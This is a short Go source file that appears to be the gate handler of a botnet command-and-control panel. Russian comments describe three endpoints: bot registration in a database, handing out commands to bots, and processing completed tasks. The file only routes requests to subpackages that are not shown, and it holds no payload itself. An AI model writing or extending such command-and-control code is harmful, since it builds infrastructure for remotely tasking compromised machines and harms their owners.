package gate

import (
	complete "./complete"
	ping "./ping"
	reg "./reg"

	"github.com/gin-gonic/gin"
)

/*
	Гейт-обработчик.
	У нас будет несколько типов гейта:
	- reg - регистрация бота в бд.
	Если бот уже существует - панель выдаст последний таск (если есть)
	- ping - выдача команд ботам.
	Если не зарегистрирванный бот отправит запрос на этот гейт -
	панель выдаст задание на регистрацию бота.
	- complete - обработка выполненных заданий
*/
func Handler(ctx *gin.Context) {
	gateType := ctx.Param("type")
	switch gateType {
	case "reg":
		reg.RegBot(ctx)
	case "ping":
		ping.SendCommand(ctx)
	case "complete":
		complete.TaskComplete(ctx)
	}
}
